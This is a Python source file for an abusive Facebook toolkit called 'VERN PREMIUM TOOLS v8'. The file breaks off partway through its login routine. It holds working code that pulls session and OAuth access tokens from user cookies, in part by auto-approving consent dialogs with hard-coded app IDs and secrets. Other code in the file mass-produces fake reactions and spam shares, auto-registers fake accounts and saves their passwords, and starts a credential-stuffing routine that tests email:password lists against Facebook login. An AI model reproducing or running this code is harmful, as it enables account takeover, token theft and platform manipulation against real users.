#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║          VERN PREMIUM TOOLS v8 — LARA APK EDITION               ║
║   Spam Share │ AU2 │ FB Clone │ Mass Comment │ Auto React       ║
║   [+] Lara APK /get_reactions engine  [+] 6-method reactor      ║
╚══════════════════════════════════════════════════════════════════╝
"""
import os, sys, re, time, json, base64, random, string, threading
import http.server, socketserver, urllib.parse, socket, hashlib, struct

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    os.system("pip install requests -q")
    import requests

# ── BANNER ────────────────────────────────────────────────────────────────────
BANNER = r"""
[95m╔══════════════════════════════════════════════════════════════╗
║  [96m██╗   ██╗███████╗██████╗ ███╗   ██╗[95m                         ║
║  [96m██║   ██║██╔════╝██╔══██╗████╗  ██║[95m  [93mPREMIUM  v8          [95m║
║  [96m██║   ██║█████╗  ██████╔╝██╔██╗ ██║[95m  [93mLARA APK EDITION     [95m║
║  [96m╚██╗ ██╔╝██╔══╝  ██╔══██╗██║╚██╗██║[95m                         ║
║  [96m ╚████╔╝ ███████╗██║  ██║██║ ╚████║[95m  [92m6-Method Reactor     [95m║
║  [96m  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝[95m                        ║
╚══════════════════════════════════════════════════════════════╝[0m
[90m  [1] Spam Share      [2] Auto Create (AU2)    [3] FB Clone/Crack
  [4] Mass Comment    [5] Auto Reaction         [6] Web Interface
  [7] Extract Token   [8] Exit[0m
"""

COLOR = {
    'r': '\033[91m', 'g': '\033[92m', 'y': '\033[93m',
    'b': '\033[94m', 'm': '\033[95m', 'c': '\033[96m',
    'w': '\033[97m', 'x': '\033[0m', 'dim': '\033[90m'
}
def c(col, txt): return COLOR.get(col,'') + str(txt) + COLOR['x']
def clear(): os.system("clear" if os.name != 'nt' else "cls")
def banner():
    clear()
    print(BANNER)
def log_ok(msg):  print(c('g', '[+] ') + str(msg))
def log_er(msg):  print(c('r', '[-] ') + str(msg))
def log_in(msg):  print(c('c', '[*] ') + str(msg))
def log_w(msg):   print(c('y', '[!] ') + str(msg))

# ── USER AGENTS ───────────────────────────────────────────────────────────────
CURL_UA     = "curl/7.68.0"
MOBILE_UA   = "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
DALVIK_UA   = "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)"
IPHONE_UA   = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
DOCOMO_UA   = "DoCoMo/2.0 N2001(c10;TB)"
FBANDROID_UA= "Mozilla/5.0 (Linux; Android 11; SM-G991B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/359.0;]"

# ── COOKIE PARSER ─────────────────────────────────────────────────────────────
def parse_cookie(raw):
    """Parse raw cookie string, handles ; or | separators."""
    raw = raw.strip()
    if not raw:
        return {}
    ck = {}
    sep = '|' if '|' in raw and ';' not in raw else ';'
    for part in raw.split(sep):
        part = part.strip()
        if '=' in part:
            k, v = part.split('=', 1)
            ck[k.strip()] = v.strip()
    return ck

def get_uid(ck):
    return ck.get('c_user', ck.get('i_user', ''))

def parse_post_url(url):
    """Extract (page_id, post_id) from any Facebook post URL."""
    url = url.strip()
    if url.isdigit():
        return None, url
    patterns = [
        (r'facebook\.com/(\d+)/posts/(\d+)', 2, 1),
        (r'facebook\.com/(?:groups/[^/]+|[^/]+)/posts/(?:pfbid)?(\d+)', 1, None),
        (r'story_fbid=(\d+)&id=(\d+)', 1, 2),
        (r'story_fbid=(\d+)', 1, None),
        (r'facebook\.com/permalink\.php\?story_fbid=(\d+)&id=(\d+)', 1, 2),
        (r'facebook\.com/(?:photo|video)\.php\?(?:fbid|v)=(\d+)', 1, None),
        (r'facebook\.com/[^/]+/(?:photos|videos)/(?:[^/]+/)?(\d+)', 1, None),
    ]
    for pat, post_g, page_g in patterns:
        m = re.search(pat, url)
        if m:
            groups = m.groups()
            post_id = groups[post_g - 1] if post_g and post_g <= len(groups) else None
            page_id = groups[page_g - 1] if page_g and page_g <= len(groups) else None
            if post_id:
                return page_id, post_id
    nums = re.findall(r'\d{10,}', url)
    if nums:
        return None, nums[-1]
    return None, None

# ── SESSION BUILDER (CORRECT cookie-per-domain setting) ──────────────────────
def make_session(ck_dict, ua=None, referer=None):
    """Build a requests Session with properly-set per-domain cookies."""
    s = requests.Session()
    # CRITICAL: set each cookie with domain=.facebook.com to preserve URL encoding
    for name, val in ck_dict.items():
        s.cookies.set(name, val, domain='.facebook.com', path='/')
    s.headers.update({
        'user-agent': ua or CURL_UA,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'identity',
    })
    if referer:
        s.headers['referer'] = referer
    return s

def compute_jazoest(dtsg):
    return str(sum(ord(ch) for ch in dtsg) + 2)

# ── TOKEN EXTRACTOR ───────────────────────────────────────────────────────────
def extract_fb_tokens(ck_dict, verbose=False):
    """
    Extract fb_dtsg, lsd, jazoest, uid from mbasic.facebook.com.
    Tries multiple UAs and pages including _fb_noscript=1 for LSD.
    """
    tokens = {
        'fb_dtsg': None, 'lsd': None,
        'jazoest': None, 'uid': get_uid(ck_dict)
    }

    DTSG_PATS = [
        r'name="fb_dtsg"\s+value="([^"]+)"',
        r'"fb_dtsg_ag"\s*,\s*"([^"]+)"',
        r'"fb_dtsg":{"token":"([^"]+)"',
        r'DTSGInitialData.*?"token":"([^"]{10,})"',
        r'"token"\s*:\s*"([^"]{20,})"[^}]*"DTSGInitial',
        r'fb_dtsg["\s=]+["\']([^"\']{20,})["\']',
    ]
    LSD_PATS = [
        r'name="lsd"\s+value="([^"]+)"',
        r'"LSD"\s*,\s*\[\]\s*,\s*\{"token"\s*:\s*"([^"]+)"',
        r'"token"\s*:\s*"([A-Za-z0-9_-]{8,})"[^}]*"LSD"',
        r'lsd["\s=]+["\']([A-Za-z0-9_-]{8,})["\']',
    ]

    sources = [
        ("https://mbasic.facebook.com/", CURL_UA),
        ("https://mbasic.facebook.com/?_fb_noscript=1", CURL_UA),
        ("https://mbasic.facebook.com/home.php", CURL_UA),
        ("https://mbasic.facebook.com/", DOCOMO_UA),
        ("https://m.facebook.com/", IPHONE_UA),
    ]

    for url, ua in sources:
        if tokens['fb_dtsg'] and tokens['lsd']:
            break
        try:
            s = make_session(ck_dict, ua)
            r = s.get(url, timeout=15, allow_redirects=True)
            html = r.text

            if not tokens['fb_dtsg']:
                for pat in DTSG_PATS:
                    m = re.search(pat, html)
                    if m:
                        tokens['fb_dtsg'] = m.group(1)
                        if verbose: log_ok(f"fb_dtsg from {url}")
                        break

            if not tokens['lsd']:
                for pat in LSD_PATS:
                    m = re.search(pat, html)
                    if m:
                        tokens['lsd'] = m.group(1)
                        if verbose: log_ok(f"lsd from {url}")
                        break

            if not tokens['jazoest']:
                m = re.search(r'name="jazoest"\s+value="([^"]+)"', html)
                if m:
                    tokens['jazoest'] = m.group(1)

        except Exception as e:
            if verbose: log_w(f"Token extract {url}: {e}")

    # Compute jazoest from dtsg if not found
    if tokens['fb_dtsg'] and not tokens['jazoest']:
        tokens['jazoest'] = compute_jazoest(tokens['fb_dtsg'])

    return tokens

# ── ACCESS TOKEN EXTRACTOR ────────────────────────────────────────────────────
def extract_access_token(ck_dict):
    """
    Extract Facebook access_token using Lara APK OAuth approach.
    Tries: OAuth implicit → OAuth confirm → homepage scrape → b-api exchange
    """
    REDIRECT = "https://www.facebook.com/connect/login_success.html"
    SCOPE = "user_friends,email,publish_actions,user_birthday,user_location,user_photos,user_status,user_videos,public_profile"
    APP_IDS = [
        "2343110832341229",
        "350685531728",
        "136085643099556",
        "804697166318506",
        "275254692598279",
        "219994525426954",
    ]

    # Method 1: OAuth implicit — check for auto-redirect with token
    for app_id in APP_IDS:
        try:
            s = make_session(ck_dict, IPHONE_UA)
            oauth_url = (
                f"https://m.facebook.com/dialog/oauth"
                f"?client_id={app_id}"
                f"&redirect_uri={urllib.parse.quote(REDIRECT)}"
                f"&scope={urllib.parse.quote(SCOPE)}"
                f"&response_type=token&ret=login&fbapp_pres=1"
            )
            r = s.get(oauth_url, timeout=15, allow_redirects=False)
            loc = r.headers.get('location', '') + r.headers.get('Location', '')
            m = re.search(r'access_token=([A-Za-z0-9_\-\.]{40,})', loc)
            if m:
                return m.group(1)

            # Method 2: Try confirm from the 200 page
            if r.status_code == 200:
                html = r.text
                # Check if token already in the page body
                m2 = re.search(r'access_token=([A-Za-z0-9_\-\.]{40,})', html)
                if m2:
                    return m2.group(1)

                # Get nonce for confirm
                nonce_m = re.search(r'"nonce"\s*:\s*"([^"]+)"', html)
                dtsg_m  = re.search(r'name="fb_dtsg"\s+value="([^"]+)"', html)
                uid_m   = re.search(r'__user=(\d+)', html) or re.search(r'"userID"\s*:\s*"(\d+)"', html)
                NONCE = nonce_m.group(1) if nonce_m else ''
                DTSG2 = dtsg_m.group(1) if dtsg_m else ''
                UID   = uid_m.group(1) if uid_m else get_uid(ck_dict)
                JAZ2  = compute_jazoest(DTSG2) if DTSG2 else ''

                if DTSG2:
                    r2 = s.post("https://m.facebook.com/dialog/oauth/confirm", data={
                        '__CONFIRM__': '1',
                        'nonce': NONCE,
                        'app_id': app_id,
                        'redirect_uri': REDIRECT,
                        'fb_dtsg': DTSG2, 'jazoest': JAZ2,
                        '__user': UID, '__a': '1',
                        'response_type': 'token',
                        'perms': SCOPE,
                        'confirm': 'Allow',
                        'button_type': 'allow',
                        'from_post': '1',
                    }, timeout=15, allow_redirects=True)

                    search_str = r2.url + r2.headers.get('location', '') + r2.text[:3000]
                    m3 = re.search(r'access_token=([A-Za-z0-9_\-\.]{40,})', search_str)
                    if m3:
                        return m3.group(1)
        except Exception:
            pass

    # Method 3: www.facebook.com EAA token scrape
    try:
        s = make_session(ck_dict, MOBILE_UA)
        r = s.get("https://www.facebook.com/", timeout=15)
        m = re.search(r'EAA[A-Za-z0-9]{60,}', r.text)
        if m:
            return m.group(0)
    except Exception:
        pass

    # Method 4: b-api.facebook.com session exchange
    BAPI_TOKENS = [
        "237759909591655|0f140aabedfb65ac27a739ed1a2263b0",
        "882a8490361da98702bf97a021ddc14d|0",
    ]
    for btoken in BAPI_TOKENS:
        try:
            s = make_session(ck_dict, DALVIK_UA)
            r = s.get(
                f"https://b-api.facebook.com/method/auth.getSessionforApp"
                f"?access_token={urllib.parse.quote(btoken)}"
                f"&format=json&new_app_id=275254692598279",
                timeout=10
            )
            data = r.json()
            if data.get('access_token') and len(data['access_token']) > 30:
                return data['access_token']
        except Exception:
            pass

    return None

# ── REACTION ENGINE — 6 METHODS ───────────────────────────────────────────────
REACTION_TYPES = {
    '1': 'LIKE', '2': 'LOVE', '3': 'HAHA', '4': 'WOW', '5': 'SAD', '6': 'ANGRY',
    'LIKE': 'LIKE', 'LOVE': 'LOVE', 'HAHA': 'HAHA',
    'WOW': 'WOW',  'SAD': 'SAD',   'ANGRY': 'ANGRY',
}
REACTION_NAMES = {
    'LIKE': 'LIKE 👍', 'LOVE': 'LOVE ❤️', 'HAHA': 'HAHA 😆',
    'WOW': 'WOW 😮',  'SAD': 'SAD 😢',   'ANGRY': 'ANGRY 😡',
}
REACTION_NUM = {'LIKE':'1','LOVE':'2','HAHA':'3','WOW':'4','SAD':'5','ANGRY':'6'}

# Multiple doc_ids for GraphQL CometUFIFeedbackReactMutation (newest first)
REACT_DOC_IDS = [
    '7003009186378350',
    '6628486183836983',
    '6370836542968344',
    '5373484252710081',
    '4706717749395336',
    '3621095391316538',
    '2015977348516460',
    '1508661019376489',
]

def _react_m1_graph_api(post_id, reaction_type, access_token):
    """Method 1: Graph API with access_token (Lara's url.submit)."""
    try:
        url = f"https://graph.facebook.com/v18.0/{post_id}/reactions"
        r = requests.post(url, params={
            "type": reaction_type,
            "access_token": access_token,
        }, timeout=15)
        data = r.json()
        if data.get('success') or data.get('id') or r.status_code == 200:
            if 'error' not in data:
                return True, "Graph API OK"
        err = data.get('error', {})
        return False, err.get('message', str(data))
    except Exception as e:
        return False, str(e)

def _react_m2_mbasic_like_link(session, post_id, reaction_type, tokens):
    """Method 2: Scrape mbasic like link → GET confirm page → POST submit."""
    uid  = tokens.get('uid', '')
    dtsg = tokens.get('fb_dtsg', '')
    lsd  = tokens.get('lsd', '')
    jaz  = tokens.get('jazoest') or (compute_jazoest(dtsg) if dtsg else '')
    rt_n = REACTION_NUM.get(reaction_type, '1')

    # Try to load story page
    story_urls = [
        f"https://mbasic.facebook.com/story.php?story_fbid={post_id}&id={uid}",
        f"https://mbasic.facebook.com/{post_id}",
        f"https://mbasic.facebook.com/",
    ]
    html = ''
    for url in story_urls:
        try:
            r = session.get(url, timeout=15)
            if r.status_code == 200:
                html = r.text
                break
        except:
            pass

    # Look for /a/like.php link (mbasic like link)
    like_links = re.findall(r'href="(/a/like\.php[^"]+)"', html, re.I)
    if not like_links:
        # Try to find any reaction link
        like_links = re.findall(r'href="(/[^"]*(?:ufi/react|add_reaction)[^"]*)"', html, re.I)

    if like_links:
        # Decode the first link and follow it
        link = like_links[0].replace('&amp;', '&')
        # Check if this link is for our post_id
        if post_id not in link:
            # Build it manually with known tokens
            pass
        else:
            try:
                r2 = session.get(f"https://mbasic.facebook.com{link}", timeout=15, allow_redirects=True)
                # The response is a confirmation page OR success
                if r2.status_code in (200, 302):
                    # If confirmation form, submit it
                    form = re.search(r'<form[^>]+action="([^"]+)"[^>]*>(.*?)</form>', r2.text, re.DOTALL|re.I)
                    if form:
                        action_url = form.group(1).replace('&amp;','&')
                        if not action_url.startswith('http'):
                            action_url = 'https://mbasic.facebook.com' + action_url
                        form_data = {}
                        for inp in re.finditer(r'<input[^>]+>', form.group(2), re.I):
                            s2 = inp.group(0)
                            nm = re.search(r'name=["\']([^"\']+)["\']', s2)
                            vl = re.search(r'value=["\']([^"\']*)["\']', s2)
                            if nm: form_data[nm.group(1)] = vl.group(1) if vl else ''
                        form_data['reaction_type'] = rt_n
                        r3 = session.post(action_url, data=form_data, timeout=15, allow_redirects=True)
                        if r3.status_code in (200, 302):
                            return True, "mbasic like link + confirm OK"
                    else:
                        return True, "mbasic like link GET OK"
            except Exception as e:
                pass

    # Direct POST to /a/like.php with all known params
    if dtsg:
        try:
            data = {
                'ft_ent_identifier': post_id,
                'reaction_type': rt_n,
                'fb_dtsg': dtsg, 'jazoest': jaz,
                '__user': uid, '__a': '1', 'av': uid,
                'lsd': lsd or '',
                'source': '22', 'ref': 'tl_r',
            }
            r = session.post('https://mbasic.facebook.com/a/like.php', data=data, timeout=15)
            resp = r.text
            # Check for success (no browser error, has JSON confirmation)
            if r.status_code == 200 and 'unsupported' not in resp.lower():
                return True, "mbasic /a/like.php POST OK"
            # If JSON for(;;) response without error, it may have worked
            if resp.startswith('for (;;);'):
                try:
                    j = json.loads(resp[9:])
                    actions = j.get('payload', {}).get('actions', []) if isinstance(j.get('payload'), dict) else []
                    for act in actions:
                        html_content = act.get('html', '')
                        if 'unsupported' not in html_content.lower() and act.get('cmd') == 'replace':
                            return True, "mbasic /a/like.php AJAX OK"
                except:
                    pass
        except Exception as e:
            pass

    return False, "mbasic like link method failed"

def _react_m3_ufi_endpoint(session, post_id, reaction_type, tokens):
    """Method 3: UFI reaction/profile/modify endpoint."""
    if not tokens.get('fb_dtsg'):
        return False, "No fb_dtsg"
    uid  = tokens.get('uid', '')
    dtsg = tokens['fb_dtsg']
    lsd  = tokens.get('lsd', '')
    jaz  = tokens.get('jazoest') or compute_jazoest(dtsg)
    rt_n = REACTION_NUM.get(reaction_type, '1')

    try:
        data = {
            'ft_ent_identifier': post_id,
            'reaction_type': rt_n,
            'action': 'main',
            'source': '22',
            'av': uid, '__user': uid,
            'fb_dtsg': dtsg, 'fb_dtsg_ag': dtsg,
            'lsd': lsd, 'jazoest': jaz,
            '__a': '1',
            '__req': random.choice(string.ascii_lowercase),
        }
        headers = {
            'x-fb-lsd': lsd,
            'x-requested-with': 'XMLHttpRequest',
            'content-type': 'application/x-www-form-urlencoded',
            'referer': 'https://www.facebook.com/',
            'origin': 'https://www.facebook.com',
        }
        r = session.post(
            'https://www.facebook.com/ufi/reaction/profile/modify/?dpr=1',
            data=data, headers=headers, timeout=15
        )
        resp = r.text
        if r.status_code == 200:
            if 'error' not in resp[:100].lower():
                return True, "UFI endpoint OK"
            err_m = re.search(r'"message"\s*:\s*"([^"]+)"', resp)
            return False, f"UFI: {err_m.group(1) if err_m else resp[:80]}"
        return False, f"UFI: HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)

def _react_m4_graphql_mutation(session, post_id, reaction_type, tokens):
    """Method 4: GraphQL CometUFIFeedbackReactMutation via /api/graphql/."""
    if not tokens.get('fb_dtsg'):
        return False, "No fb_dtsg"
    uid  = tokens.get('uid', '')
    dtsg = tokens['fb_dtsg']
    lsd  = tokens.get('lsd', '')
    jaz  = tokens.get('jazoest') or compute_jazoest(dtsg)

    feedback_id = base64.b64encode(f"feedback:{post_id}".encode()).decode()
    variables = json.dumps({
        "input": {
            "client_mutation_id": str(random.randint(1, 99)),
            "actor_id": uid,
            "feedback_id": feedback_id,
            "feedback_reaction": reaction_type,
            "feedback_source": "OBJECT",
            "is_tracking_encrypted": True,
            "tracking": [],
        }
    })

    headers = {
        'x-fb-lsd': lsd,
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/',
        'x-requested-with': 'XMLHttpRequest',
    }

    for doc_id in REACT_DOC_IDS:
        try:
            data = {
                'av': uid, '__user': uid, '__a': '1',
                'lsd': lsd, 'jazoest': jaz, 'fb_dtsg': dtsg,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
                'variables': variables,
                'server_timestamps': 'true',
                'doc_id': doc_id,
            }
            r = session.post(
                'https://www.facebook.com/api/graphql/',
                data=data, headers=headers, timeout=15
            )
            resp = r.text.lstrip('for(;;);')
            # Error 1357001 = not logged in, 1357004 = expired doc_id, skip to next
            err_m = re.search(r'"error"\s*:\s*(\d+)', resp)
            if err_m:
                err_code = int(err_m.group(1))
                if err_code == 1357001:  # not logged in — stop
                    return False, "Not logged in (1357001)"
                if err_code == 1357004:  # expired doc_id — try next
                    continue
                return False, f"GraphQL error {err_code}"
            # No error — success
            if r.status_code == 200:
                return True, f"GraphQL mutation OK (doc_id={doc_id})"
        except Exception as e:
            continue

    return False, "All GraphQL doc_ids exhausted"

def _react_m5_mbasic_form(session, post_id, reaction_type, tokens):
    """Method 5: mbasic UFI reaction form (scrape form → POST)."""
    uid  = tokens.get('uid', '')
    dtsg = tokens.get('fb_dtsg', '')
    lsd  = tokens.get('lsd', '')
    jaz  = tokens.get('jazoest') or (compute_jazoest(dtsg) if dtsg else '')
    rt_n = REACTION_NUM.get(reaction_type, '1')

    story_urls = [
        f"https://mbasic.facebook.com/story.php?story_fbid={post_id}&id={uid}",
        f"https://mbasic.facebook.com/{post_id}",
    ]
    for url in story_urls:
        try:
            r = session.get(url, timeout=15)
            html = r.text
            # Find reaction form
            form_m = re.search(
                r'<form[^>]+action="([^"]*(?:ufi/react|reaction|add_react)[^"]*)"[^>]*>(.*?)</form>',
                html, re.DOTALL | re.I
            )
            if form_m:
                action = form_m.group(1).replace('&amp;', '&')
                if not action.startswith('http'):
                    action = 'https://mbasic.facebook.com' + action
                form_data = {}
                for inp in re.finditer(r'<input[^>]+>', form_m.group(2), re.I):
                    s2 = inp.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', s2)
                    vl = re.search(r'value=["\']([^"\']*)["\']', s2)
                    if nm: form_data[nm.group(1)] = vl.group(1) if vl else ''
                form_data.update({
                    'reaction_type': rt_n, 'target': post_id,
                    'fb_dtsg': dtsg, 'lsd': lsd, 'jazoest': jaz,
                })
                r2 = session.post(action, data=form_data, timeout=15, allow_redirects=True)
                if r2.status_code in (200, 302) and 'error' not in r2.url:
                    return True, "mbasic form OK"
        except Exception:
            pass
    return False, "mbasic form not found"

def _react_m6_get_reactions_lara(session, post_id, reaction_type, tokens):
    """Method 6: Lara APK's /get_reactions endpoint (from APK DEX analysis)."""
    uid  = tokens.get('uid', '')
    dtsg = tokens.get('fb_dtsg', '')
    lsd  = tokens.get('lsd', '')
    jaz  = tokens.get('jazoest') or (compute_jazoest(dtsg) if dtsg else '')
    rt_n = REACTION_NUM.get(reaction_type, '1')

    endpoints = [
        'https://mbasic.facebook.com/get_reactions/',
        'https://mbasic.facebook.com/ufi/get_reactions/',
    ]
    for url in endpoints:
        try:
            data = {
                'ft_ent_identifier': post_id,
                'reaction_type': rt_n,
                'fb_dtsg': dtsg, 'jazoest': jaz,
                '__user': uid, 'av': uid,
                'lsd': lsd or '',
                '__a': '1',
            }
            r = session.post(url, data=data, timeout=15)
            if r.status_code == 200:
                # Success if no checkpoint/error redirect and no "unsupported browser" in JSON response
                if 'unsupported' not in r.text.lower()[:500]:
                    return True, f"Lara /get_reactions OK ({url})"
        except Exception:
            pass
    return False, "Lara /get_reactions failed"

def do_react(ck_dict, post_id, reaction_type, access_token=None):
    """
    Master reaction dispatcher — tries all 6 methods:
    1. Graph API (with access_token)
    2. mbasic like link
    3. UFI endpoint
    4. GraphQL mutation (multiple doc_ids)
    5. mbasic form
    6. Lara /get_reactions endpoint
    """
    rt = REACTION_TYPES.get(str(reaction_type).upper(), 'LIKE')

    tokens = extract_fb_tokens(ck_dict)
    session_curl   = make_session(ck_dict, CURL_UA)
    session_mobile = make_session(ck_dict, MOBILE_UA)

    results = []

    # M1: Graph API
    if access_token:
        ok, msg = _react_m1_graph_api(post_id, rt, access_token)
        if ok:
            return True, f"[M1:GraphAPI] {msg}"
        results.append(f"M1:{msg}")

    # M2: mbasic like link
    ok, msg = _react_m2_mbasic_like_link(session_curl, post_id, rt, tokens)
    if ok:
        return True, f"[M2:mbasic] {msg}"
    results.append(f"M2:{msg}")

    # M3: UFI endpoint
    ok, msg = _react_m3_ufi_endpoint(session_mobile, post_id, rt, tokens)
    if ok:
        return True, f"[M3:UFI] {msg}"
    results.append(f"M3:{msg}")

    # M4: GraphQL mutation
    ok, msg = _react_m4_graphql_mutation(session_mobile, post_id, rt, tokens)
    if ok:
        return True, f"[M4:GraphQL] {msg}"
    results.append(f"M4:{msg}")

    # M5: mbasic form
    ok, msg = _react_m5_mbasic_form(session_curl, post_id, rt, tokens)
    if ok:
        return True, f"[M5:form] {msg}"
    results.append(f"M5:{msg}")

    # M6: Lara /get_reactions
    ok, msg = _react_m6_get_reactions_lara(session_curl, post_id, rt, tokens)
    if ok:
        return True, f"[M6:Lara] {msg}"
    results.append(f"M6:{msg}")

    return False, " | ".join(results)

# ── SPAM SHARE ────────────────────────────────────────────────────────────────
def spam_share(ck_dict, post_url, count, speed=3):
    """Share a post N times using mbasic share composer."""
    uid = get_uid(ck_dict)
    _, post_id = parse_post_url(post_url)
    if not post_id:
        log_er("Could not parse post ID")
        return 0

    session = make_session(ck_dict, CURL_UA)
    tokens  = extract_fb_tokens(ck_dict)
    dtsg    = tokens.get('fb_dtsg')
    lsd     = tokens.get('lsd', '')

    if not dtsg:
        log_er("Could not get fb_dtsg for share")
        return 0

    jaz = tokens.get('jazoest') or compute_jazoest(dtsg)
    log_in(f"Spam Share: {count}x post={post_id} uid={uid}")
    ok_count = 0

    for i in range(count):
        try:
            # Try mbasic share form first
            r0 = session.get(f"https://mbasic.facebook.com/{post_id}", timeout=15)
            share_link = re.search(r'href="(/[^"]*share[^"]*)"', r0.text, re.I)

            if share_link:
                link = share_link.group(1).replace('&amp;', '&')
                r1 = session.get(f"https://mbasic.facebook.com{link}", timeout=15)
                form_m = re.search(
                    r'<form[^>]+action="([^"]+)"[^>]*>(.*?)</form>',
                    r1.text, re.DOTALL | re.I
                )
                if form_m:
                    action = form_m.group(1).replace('&amp;','&')
                    if not action.startswith('http'):
                        action = 'https://mbasic.facebook.com' + action
                    fd = {}
                    for inp in re.finditer(r'<input[^>]+>', form_m.group(2), re.I):
                        s2 = inp.group(0)
                        nm = re.search(r'name=["\']([^"\']+)["\']', s2)
                        vl = re.search(r'value=["\']([^"\']*)["\']', s2)
                        if nm: fd[nm.group(1)] = vl.group(1) if vl else ''
                    fd.update({'fb_dtsg': dtsg, 'lsd': lsd, 'jazoest': jaz})
                    r2 = session.post(action, data=fd, timeout=15, allow_redirects=True)
                    if r2.status_code in (200, 302):
                        ok_count += 1
                        log_ok(f"[{i+1}/{count}] Share OK (mbasic form)")
                        if i < count - 1: time.sleep(speed)
                        continue

            # Fallback: GraphQL sharedPost mutation
            data = {
                'ft_ent_identifier': post_id,
                'fb_dtsg': dtsg, 'lsd': lsd or '', 'jazoest': jaz,
                '__user': uid, '__a': '1', 'av': uid,
                'story_type': '100',
                'composer_session_id': ''.join(random.choices(string.ascii_letters, k=12)),
                'profile_id': uid, 'target_id': uid,
            }
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd or '',
                'referer': 'https://mbasic.facebook.com/',
            }
            r = session.post(
                'https://mbasic.facebook.com/share/composer/',
                data=data, headers=headers, timeout=15
            )
            if r.status_code in (200, 302):
                ok_count += 1
                log_ok(f"[{i+1}/{count}] Share OK")
            else:
                log_er(f"[{i+1}/{count}] Share failed: {r.status_code}")

        except Exception as e:
            log_er(f"[{i+1}/{count}] Error: {e}")

        if i < count - 1:
            time.sleep(speed)

    log_in(f"Spam Share done: {ok_count}/{count} OK")
    return ok_count

# ── AUTO CREATE (AU2) ─────────────────────────────────────────────────────────
def auto_create(count, email_prefix=None, speed=5):
    """Auto-create Facebook accounts via m.facebook.com/reg/"""
    names_f = ["Maria","Sofia","Layla","Ana","Camille","Nikki","Bea","Ria","Tina","Ysa",
               "Chloe","Mia","Nina","Lila","Gigi","Mae","Joy","Jen","Luz","Rose"]
    names_m = ["Jose","Marco","Diego","Angelo","Carlo","Luis","Rico","Rex","Vince","Ian",
               "Ken","Dan","Jay","Roy","Ben","Sam","Max","Leo","Nico","Vito"]
    snames  = ["Santos","Cruz","Reyes","Garcia","Torres","Lopez","Gomez","Luna","Dela Cruz","Bautista"]

    results = []
    log_in(f"Auto Create: {count} accounts")

    for i in range(count):
        gender = random.choice([1, 2])
        fname  = random.choice(names_f if gender == 2 else names_m)
        lname  = random.choice(snames)
        by, bm, bd = random.randint(1990, 2000), random.randint(1, 12), random.randint(1, 28)
        pw     = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + "!A1"
        email  = f"{email_prefix}{random.randint(100,9999)}@gmail.com" if email_prefix else \
                 f"{fname.lower()}{lname.lower()}{random.randint(10,99)}@gmail.com"
        try:
            s = requests.Session()
            s.headers.update({'user-agent': MOBILE_UA, 'accept-encoding': 'identity'})
            r = s.get("https://m.facebook.com/r.php", timeout=15)
            html = r.text
            lsd_m    = re.search(r'name="lsd"\s+value="([^"]+)"', html)
            jazoest_m= re.search(r'name="jazoest"\s+value="([^"]+)"', html)

            data = {
                'firstname': fname, 'lastname': lname,
                'reg_email__': email, 'reg_email_confirmation__': email,
                'reg_passwd__': pw,
                'birthday_day': str(bd), 'birthday_month': str(bm), 'birthday_year': str(by),
                'sex': str(gender),
                'websubmit': 'Sign Up',
                'lsd': lsd_m.group(1) if lsd_m else '',
                'jazoest': jazoest_m.group(1) if jazoest_m else '',
                'ns': '0', 'ri': 'signed_out_home',
            }
            r2 = s.post("https://m.facebook.com/reg/", data=data, timeout=15, allow_redirects=True)
            if r2.status_code == 200 or 'confirm' in r2.url or 'checkpoint' in r2.url:
                acc = {'email': email, 'password': pw, 'name': f"{fname} {lname}"}
                results.append(acc)
                log_ok(f"[{i+1}/{count}] {email} | {pw}")
            else:
                log_er(f"[{i+1}/{count}] Failed: HTTP {r2.status_code}")
        except Exception as e:
            log_er(f"[{i+1}/{count}] Error: {e}")

        if i < count - 1:
            time.sleep(speed)

    if results:
        fn = f"/sdcard/au2_accounts_{int(time.time())}.txt"
        try:
            with open(fn, 'w') as f:
                for acc in results:
                    f.write(f"{acc['email']}|{acc['password']}|{acc['name']}\n")
            log_ok(f"Saved to {fn}")
        except:
            fn = f"/tmp/au2_{int(time.time())}.txt"
            with open(fn, 'w') as f:
                for acc in results:
                    f.write(f"{acc['email']}|{acc['password']}|{acc['name']}\n")
            log_ok(f"Saved to {fn}")

    return results

# ── FB CLONE / CRACKING ───────────────────────────────────────────────────────
def fb_clone_crack(combo_list, speed=1):
    """Test email:password combos against Facebook login."""
    results = {'hit': [], 'dead': [], 'error': []}
    log_in(f"FB Clone: {len(combo_list)} combos")

    for i, combo in enumerate(combo_list, 1):
        sep = ':' if ':' in combo else ('|' if '|' in combo else None)
        if not sep:
            results['error'].append(combo)
            continue
        parts = combo.split(sep, 1)
        if len(parts) != 2:
            continue
        email, pw = parts[0].strip(), parts[1].strip()

        try:
            s = requests.Session()
            s.headers.update({'user-agent': CURL_UA, 'accept-encoding': 'identity'})
            r0 = s.get("https://mbasic.facebook.com/", timeout=12)
            html0 = r0.text
            lsd_m  = re.search(r'name="lsd"\s+value="([^"]+)"', html0)
            jaz_m  = re.search(r'name="jazoest"\s+value="([^"]+)"', html0)

            data = {
                'email': email, 'pass': pw, 'login': 'Log In',
                'lsd': lsd_m.group(1) if lsd_m else '',
